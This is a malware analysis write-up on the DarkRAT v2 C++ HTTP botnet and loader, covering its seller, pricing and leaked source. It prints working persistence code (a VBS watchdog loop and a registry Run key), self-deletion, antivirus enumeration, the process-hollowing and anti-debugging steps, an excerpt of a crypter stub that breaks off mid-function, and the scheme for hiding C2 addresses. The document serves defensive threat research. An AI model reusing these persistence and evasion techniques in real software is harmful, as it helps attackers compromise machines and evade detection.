# DarkRat v2.2.0
#### Technical synopsis of a _C++ Native HTTP Botnet and Loader_

![DarkRATv2](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/logo.png)  

###### Description
Darkrat was first found being advertised on HF and is described by the creator as:  

`Darkrat is designed as a HTTP loader, it is coded in C++ with no dependency, the Current bot is design for the Windows API! this means, *DarkRat* has no Cross Platform Support.`  

This HTTP loader - in reality - acts more like a bot controller.  

###### Disclaimer  
The developer also puts out a small disclaimer in order to avoid potential litigation:  
This is often seen with other RATs.  

```

```  

Then my question is: why is it only advertised on underground cybercrime forums?

###### The developer
The dev uses the moniker `Darkspider` on both HF and both in the compiled executables pdb path.  
Crawling through Darkspider's posts on HF, there seems to be some clue to his german/austrian/swiss origin:  
![dev1](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/darkspider1.png)  
![dev2](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/darkspider2.png)  

The dev is also present on Discord and has a channel where he announced milestones regarding his RAT:
![discord](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/discord.png)  
![discord2](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/discord2.png)  
![discord3](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/discord3.png)  
![olddarkrat](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/olddarkrat.png)  

###### Pricing, forums, seller
Darkspider offers 3 packages that customers can potentially choose from:  

> - Basic/GOLD:  unlimited  
> - Source Version: There is unfortunately only two version available because I can not give any development support (8/10 SOLD)  
> - Private Versions: On Request  

The dev also sells source versions which means DarkRatv2 is potentially being re-selled by other individuals too.

###### Relation to other families
Interesting enough to note that the main description of DarkRAT is basically a copy-paste of AbSent-Loader's description. As we will see with the inner workings, clearly, the developer took a lot of ideas and inspiration from both:  
<https://github.com/Tlgyt/AbSent-Loader>  
<https://github.com/zettabithf/LiteHTTP>  

Just recently, a new Botnet was also announced on HF: it has unmistakable ties to DarkRATv2.
I will try to keep track all of the different 'forks' of DarRAT, since it's really favored in cybercrime rings:   
![origins](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/origins.png)  

###### Additional documentation:  
The developer maintains a DarkRAT manual on:  
<http://darktools.me/docs/>  
<http://wsyl2u7uvfml6p7p.onion/docs/>  

Also it's possible to gain additional insights into the workings of the panel by browsing to README.md on a C2 server:

## Functionalities

###### Execution flow  
![process](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/processgraph.png)  

###### Running Persistance  
Command: `cmd.exe /k start %APPDATA%\Microsoft\Windows\00jXHoowyD.vbs:` 
<pre>
Do
sComputerName = "."  
Set objWMIService = GetObject("winmgmts:\\" & sComputerName & "\root\cimv2")  
sQuery = "SELECT * FROM Win32_Process"  
Set objItems = objWMIService.ExecQuery(sQuery)  
Dim found  
found = "false"  
For Each objItem In objItems  
If objItem.Name = "00jXHoowyD.exe" Then  
found = "true"  
End If  
Next  
If found = "false" Then  
Dim objShell  
Set objShell = WScript.CreateObject("WScript.Shell")  
objShell.Run("C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\00jXHoowyD.exe > Nul ")  
Set objShell = Nothing  
End If  
WScript.Sleep 1000  
Loop
</pre>  

The vbs file provides periodic checks to ascertain whether the process is running in the background or not.

###### Startup Persistance  
API: `RegSetValueExA`  
Key: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\WinSystem32`  
Value: `C:\Users\user\AppData\Roaming\Microsoft\Windows\00jXHoowyD.exe`  

![registry](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/registry.png)  

Tries to be shady by calling itself WinSystem32.  
The Run key points to the following location on the file system.  

Leaked source:  
```c
void addstartup()
{
	TCHAR path[100];
	GetModuleFileName(NULL, path, 100);
	HKEY newValue;
	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
	RegSetValueEx(newValue, "System32", 0, REG_SZ, (LPBYTE)path, sizeof(path));
	RegCloseKey(newValue);
}
```

###### Installed hidden on the FileSystem  
`\AppData\Roaming\Microsoft\Windows\00jXHoowyD.exe`  
or  
`\AppData\Roaming\WinBootSystem\WinBootSystem.exe`  

![persist](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/persistance.png)  

Being hidden means the executable is just put into %APPDATA% under the Windows folder.  

###### Uninstall  
`cmd.exe /C ping 127.0.0.1 -n 1 -w 3000 > Nul & Del /f /q "%s"`  

![cleanup](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/cleanup.png)  

Leaked source:  
```c
void uninstall() {
	removeRegInstallKey();
	std::string remove = " /C \"PING.EXE -n 5 127.0.0.1 && del " + ExePath() + "\"";
	ShellExecute(
		NULL,
		_T("open"),
		_T("cmd"),
		_T(remove.c_str()), // params                            
		_T(" C:\ "),
		SW_HIDE);
}
```

###### AV Detection
`wmi with WQL Select * From AntiVirusProduct via root\SecurityCenter2`  

![av1](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/code_av.png)  
![av2](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/code_av2.png)  

Leaked source code:  
```c
std::string getCurrentAv() {
	std::string returnString;
	CoInitializeEx(0, 0);
	CoInitializeSecurity(0, -1, 0, 0, 0, 3, 0, 0, 0);
	IWbemLocator* locator = 0;
	CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)& locator);
	IWbemServices* services = 0;
	wchar_t* name = L"root\\SecurityCenter2";
	if (SUCCEEDED(locator->ConnectServer(name, 0, 0, 0, 0, 0, 0, &services))) {
		//printf("Connected!\n");
		//Lets get system information
		CoSetProxyBlanket(services, 10, 0, 0, 3, 3, 0, 0);
		wchar_t* query = L"Select * From AntiVirusProduct";
		IEnumWbemClassObject* e = 0;
		if (SUCCEEDED(services->ExecQuery(L"WQL", query, WBEM_FLAG_FORWARD_ONLY, 0, &e))) {
			//printf("Query executed successfuly!\n");
			IWbemClassObject* object = 0;
			ULONG u = 0;
			//lets enumerate all data from this table
			std::string antiVirus;
			while (e) {
				e->Next(WBEM_INFINITE, 1, &object, &u);
				if (!u) break;//no more data,end enumeration
				CComVariant cvtVersion;
				object->Get(L"displayName", 0, &cvtVersion, 0, 0);
				//std::wcout << cvtVersion.bstrVal;
				returnString = bstr_to_str(cvtVersion.bstrVal);
			}
		}
		else
			printf("Error executing query!\n");
	}
	else
		printf("Connection error!\n");
	//Close all used data
	services->Release();
	locator->Release();
	CoUninitialize();

	return returnString;
}
```

###### Mutex  
API: `CreateMutexA`  
Value: `Local\3mCUq1z`  

![mutex1](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/mutex.png)  
![mutex2](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/mutex2.png)  

The mutex value is hardcoded and is different between samples. The call to CreateMutex returns a handle to the mutex '3mCUq1z' in this case.  
Next, GetLastError is called to determine whether the handle points to the same mutex that perhaps already existed.  
Then, the code compares the return of the GetLastError call to the hex value 'B7'. 'B7' is the symbolic constant for ERROR_ALREADY_EXISTS.  
If the mutex already exists, it won't re-infect the system.  

Leaked source:  
```c
		//Check if the Bot is Running
		CreateMutexA(0, FALSE, "Local\\$myprogram$"); // try to create a named mutex
		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
			return -1; // quit; mutex is released automatically
```

###### Custom DLL Loading
1. `CreateProcessA` - _dwCreationFlags 4 - CREATE_SUSPENDED_
2. `VirtualAlloc`
3. `GetThreadContext`
4. `ReadProcessMemory`
5. `GetModuleHandleA` - _NtUnmapViewofSection_
6. `GetProcAddress` - _ntdll.dll_
7. `VirtualAllocEx`
8. `WriteProcessMemory`
9. `SetThreadContext`
10. `ResumeThread`
11. `VirtualFree`

![hollow4](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/proc_hollow4.png)  

![hollow5](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/proc_hollow5.png)  

This method is known as process hollowing. Malware can unmap or hollow out code from the memory of a process, and overwrite the same memory space of the process with malicious code. First, the malware needs to create a new process in suspended mode (CreationFlags 4).  
Next, the malware swaps out the contents of the benign file with the malicious code. This is where the call to NtUnmapViewOfSection comes into picture, which is dynamically called from ntdll.dll to unmap the memory of the target process.  
Now that the memory is unmapped, VirtualAllocEx is called to allocate new memory for the malware, and uses WriteProcessMemory to write each of the malware’s sections to the target process memory space. The malware also calls SetThreadContext to point the entrypoint to a new code section.  
As a last step, the malware resumes the suspended thread by calling ResumeThread, so that the process will continues with newly allocated malicious code.  

###### Anti-debugging techniques
- IsDebuggerPresent API call  
- CheckRemoteDebuggerPresent API call  
![debug1](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/code_debug.png)  
- mov eax, large fs:30h  
This is used to load the address of the Process Environment Block (PEB), which is accessible via the FS segment. The PEB contains a BeingDebugged field which can be read to see if a process is being debugged.  
![debug2](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/code_debug2.png)  
- rdtsc  
The RDTSC instruction is used to determine how quickly the processor executes a program's instructions. It returns the count of the number of ticks since the last system reboot as a 64-bit value placed into EDX:EAX. Slowness in the processor's execution might indicate the presence of malware analysis tools, such as a debugger.  
![debug3](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/code_debug3.png)  
- QueryPerformanceCounter API call  
- GetTickCount API call  
![debug4](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/code_debug4.png)  

###### Anti-error technique
DarkRATv2 disables Windows error notifications right at the start of the program.  
`API: SetErrorMode`  
`Value: 0x8007h`  

- SEM_FAILCRITICALERRORS  
- SEM_NOALIGNMENTFAULTEXCEPT  
- SEM_NOOPENFILEERRORBOX  
- SEM_NOGPFAULTERRORBOX  
![error](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/errormode.png)  

## Leaked source code
An early version of the final Botnet was leaked through the following github repo:  
- https://github.com/Tlgyt/The-Collection/blob/master/Source%20Codes/Botnets/DarkRat%20Loader/derkrut/main.cpp  

The developer desperately tried to get rid of the leaked source by submitting a dispute through Github:  
![source](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/source.png)  

Also discloses his Discord account:  
![source1](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/source1.png)  

#### Other references
Leveraging a bit of OSINT, it is also clear that the developer had used lots of resources from LiteHTTP Botnet.
It's clearly a trend: up and coming malware dev take an existing malware as a recipe, add a few modifications here and there and release the new iteration as a completely new 'product':

#### Cryptography
There's a distinct string in the disassembly of the builder:  

![cryptob](https://raw.githubusercontent.com/albertzsigovits/malware-writeups/master/DarkRATv2/img/cryptob.png)  

It is also found in the following project: hCrypt, which is an AES encrypted PE Loader:  
https://github.com/Include-sys/hCrypt/blob/master/Stub/main.cpp  

```c
#include <fstream>
#include "VirtualAES\VirtualAES.h"
#include <Windows.h>
#include <TlHelp32.h>

/*
*	AES Encrypted and AntiVM PE Loader (Crypter Stub)
*	
*	https://www.github.com/Include-sys/hCrypt
*
*	Coded by Include-sys for Educational Purposes
*/

/*		Virtual Machine Detection Functions			*/
```

```c
/*		  AES-256 Bit Decryption Function			*/	
void AESDecrypt(char* toDecrypt, int size)
{
	//Explanation exist in Builder
	unsigned char key[KEY_256] = "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>";

	unsigned char ciphertext[BLOCK_SIZE];
	unsigned char decrypted[BLOCK_SIZE];

	aes_ctx_t* ctx;
	virtualAES::initialize();
	ctx = virtualAES::allocatectx(key, sizeof(key));

## Hiding C2 addresses
Initially the C2 server address is hidden from your eyes. The developer had implemented a layered approach into how a certain sample is deciding which C2 server it connects to.  
1. There's a pastebin link in plain text embedded in the sample  
2. There's also a decryption key in plain text in the sample  
3. Sample gets pastebin link, content is generally a base64 encoded string  
4. Decoding the base64 string reveals a binary blob  
5. Then the binary blob gets decrypted with the initial key and then the plain-text is the C2 address
